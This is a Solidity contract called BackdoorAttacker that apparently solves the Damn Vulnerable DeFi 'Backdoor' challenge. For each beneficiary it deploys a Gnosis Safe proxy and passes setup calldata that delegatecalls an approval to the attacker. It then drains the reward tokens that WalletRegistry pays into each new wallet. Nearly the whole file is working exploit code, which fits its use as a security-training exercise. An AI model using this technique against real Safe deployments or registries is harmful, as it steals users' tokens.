// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../backdoor/WalletRegistry.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "hardhat/console.sol";

contract BackdoorAttacker {

    WalletRegistry immutable private wallet;
    GnosisSafeProxyFactory immutable private proxyFactory;
    address immutable private singleton; // GnosisSafe
    IERC20 immutable private token;

    constructor(address _wallet, address _proxyFactory, address _singleton, address _token) {
        wallet = WalletRegistry(_wallet);
        proxyFactory = GnosisSafeProxyFactory(_proxyFactory);
        singleton = _singleton;
        token = IERC20(_token);
    }

    function attack(address[] calldata users, uint256 amount) external {
        for (uint i = 0; i < users.length; i++){
            address[] memory _owners = new address[](1);
            _owners[0] = users[i];
            bytes memory data = abi.encodeWithSignature("setupFallback(uint256,address)", amount, address(this));

            bytes memory initializer2 = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
            _owners, 1, address(this), data, address(this), address(0), 0, msg.sender);

            GnosisSafeProxy proxy = proxyFactory.createProxyWithCallback(singleton, initializer2, 0, wallet);

            token.transferFrom(address(proxy), msg.sender, amount);

            console.log(token.balanceOf(msg.sender));
        }
    }

    function setupFallback(uint256 amount, address me) external{
        token.approve(me, amount);
    }

    receive() external payable{}

    // function setup(
    //     address[] calldata _owners,
    //     uint256 _threshold,
    //     address to,
    //     bytes calldata data,
    //     address fallbackHandler,
    //     address paymentToken,
    //     uint256 payment,
    //     address payable paymentReceiver
    // ) external
}